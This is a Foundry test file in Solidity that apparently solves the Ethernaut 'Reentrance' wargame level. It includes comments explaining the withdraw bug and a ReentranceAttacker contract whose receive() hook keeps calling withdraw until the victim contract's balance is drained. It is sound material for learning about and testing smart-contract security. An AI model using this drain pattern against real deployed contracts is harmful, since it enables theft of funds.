// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

import "forge-std/Test.sol";

import "../levels/10-Reentrancy/ReentranceFactory.sol";
import "../core/Ethernaut.sol";

contract ReentranceTest is Test {
    Ethernaut ethernaut;
    address attacker = makeAddr("attacker");

    function setUp() public {
        ethernaut = new Ethernaut();
        vm.deal(attacker, 1 ether);
    }

    function testReentranceHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////
        ReentranceFactory reentranceFactory = new ReentranceFactory();
        ethernaut.registerLevel(reentranceFactory);
        vm.startPrank(attacker);
        address levelAddress = ethernaut.createLevelInstance{value: 0.001 ether}(reentranceFactory);
        Reentrance ethernautReentrance = Reentrance(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////

        // By analyzing the Reentrance, bugs can be spotted.
        // withdraw function do not use SafeMath when updating the balance
        // and do not follow the check effect interaction pattern.
        // As it is using a solidity version < 0.8.0 in the original version,
        // there is no automatic underflow/overflow checks.
        // Also it sends back eth with a low level call hence it is vulnerable to reentrancy
        // where an attacker contract can take over the flow.

        // Deploy attack contract and fund it
        ReentranceAttacker reentranceAttacker =
            new ReentranceAttacker{value: 0.0001 ether}(address(ethernautReentrance));
        reentranceAttacker.reenter();

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}

contract ReentranceAttacker {
    Reentrance reentrance;
    uint256 initialBalance;

    constructor(address _reentrance) public payable {
        require(_reentrance.code.length > 0, "Not a contract");
        reentrance = Reentrance(payable(_reentrance));
        initialBalance = msg.value;
    }

    function reenter() external {
        // Donate to Reentrance to be able to withdraw
        reentrance.donate{value: address(this).balance}(address(this));
        // Withdraw from victim contract
        reentrance.withdraw(address(this).balance);
    }

    receive() external payable {
        // calculate balance of reentrance contract
        uint256 victimBalance = address(reentrance).balance;
        // if not empty, withdraw again
        if (victimBalance != 0) {
            uint256 withdrawAmount = victimBalance > initialBalance ? initialBalance : victimBalance;
            reentrance.withdraw(withdrawAmount);
        }
    }
}
